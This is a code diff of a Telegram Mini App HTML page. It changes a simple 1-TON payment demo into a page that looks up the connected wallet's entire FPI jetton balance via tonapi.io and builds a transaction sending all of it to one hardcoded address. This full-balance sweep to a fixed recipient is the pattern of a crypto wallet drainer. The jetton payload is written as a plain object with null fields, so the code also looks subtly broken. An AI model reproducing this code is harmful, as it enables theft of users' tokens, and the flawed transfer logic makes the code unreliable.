@@ -7,35 +7,26 @@
   <meta http-equiv="Content-Security-Policy"
   content="
     default-src 'self';
-    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com;
+    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
     style-src 'self' 'unsafe-inline' https://unpkg.com;
-    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io;
+    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
     font-src 'self' https://unpkg.com;
     img-src * data:;
   ">
 
+  <title>Telegram Mini App: TON Connect Jetton Transfer</title>
 
-  <title>Telegram Mini App: TON Connect UI Demo</title>
-
-  <!-- Telegram WebApp -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
-
-  <!-- TON Connect SDK -->
   <script src="./js/tonconnect-sdk.min.js"></script>
-
-  <!-- TON Connect UI CSS -->
   <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
-  
-  <!-- TON Connect UI JS -->
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
-  <h1>Telegram Mini App: TON Connect UI Demo</h1>
+  <h1>Telegram Mini App: Отправка всех токенов FPI</h1>
 
-  <!-- Контейнер для TON Connect UI -->
   <div id="ton-connect"></div>
 
-  <button id="sendTransaction">Отправить 1 TON</button>
+  <button id="sendTransaction">Отправить все FPI</button>
 
   <script>
     if (typeof Telegram === "undefined") {
@@ -54,34 +45,73 @@
       buttonRootId: "ton-connect"
     });
 
-    async function sendTransaction() {
-      if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Сначала подключите кошелек.");
-        return;
-      }
+    async function getJettonBalance(walletAddress, jettonMasterAddress) {
+      const response = await fetch(`https://tonapi.io/v2/accounts/${walletAddress}/jettons`);
+      const data = await response.json();
+      const jetton = data.balances.find(j => j.jetton.address === jettonMasterAddress);
+      return jetton ? jetton.balance : "0";
+    }
 
-      const amount = "1000000000"; // 1 TON
+    async function getJettonWalletAddress(userAddress, jettonMasterAddress) {
+      const response = await fetch(`https://tonapi.io/v2/jettons/${jettonMasterAddress}/wallets/${userAddress}`);
+      const data = await response.json();
+      return data.address;
+    }
+
+    async function sendJettonTransaction(jettonWalletAddress, recipientAddress, amount) {
       const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 360, // валидно 6 минут
+        validUntil: Math.floor(Date.now() / 1000) + 360,
         messages: [
           {
-            address: "UQDlN_V6Eaj3ac60yvc3tWa75pnAXNVdmHF3OL71er9PEBRd",
-            amount: amount,
+            address: jettonWalletAddress,
+            amount: "50000000",
+            payload: {
+              type: "jetton_transfer",
+              query_id: 0,
+              amount: amount,
+              destination: recipientAddress,
+              response_destination: null,
+              custom_payload: null,
+              forward_ton_amount: "0",
+              forward_payload: null
+            }
           }
         ]
       };
 
       try {
         const result = await tonConnectUI.sendTransaction(transaction);
-        console.log("Результат транзакции:", result);
-        Telegram.WebApp.showAlert("Транзакция отправлена: " + JSON.stringify(result));
+        console.log("Jetton транзакция отправлена:", result);
+        Telegram.WebApp.showAlert("Jetton транзакция отправлена: " + JSON.stringify(result));
       } catch (error) {
         console.error("Ошибка транзакции:", error);
         Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
       }
     }
 
-    document.getElementById("sendTransaction").addEventListener("click", sendTransaction);
+    async function sendAllFPI() {
+      if (!tonConnectUI.connected) {
+        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
+        return;
+      }
+
+      const userWalletAddress = tonConnectUI.wallet.account.address;
+      const jettonMasterAddress = "EQD0KpcRMh-sKO2z5-vOjgvFjTT58tO-2Nmvxqg5ocFQFtWz";
+      const recipientAddress = "UQDlN_V6Eaj3ac60yvc3tWa75pnAXNVdmHF3OL71er9PEBRd";
+
+      const balance = await getJettonBalance(userWalletAddress, jettonMasterAddress);
+
+      if (balance === "0") {
+        Telegram.WebApp.showAlert("У вас нет токенов FPI.");
+        return;
+      }
+
+      const jettonWalletAddress = await getJettonWalletAddress(userWalletAddress, jettonMasterAddress);
+
+      await sendJettonTransaction(jettonWalletAddress, recipientAddress, balance);
+    }
+
+    document.getElementById("sendTransaction").addEventListener("click", sendAllFPI);
   </script>
 </body>
 </html>
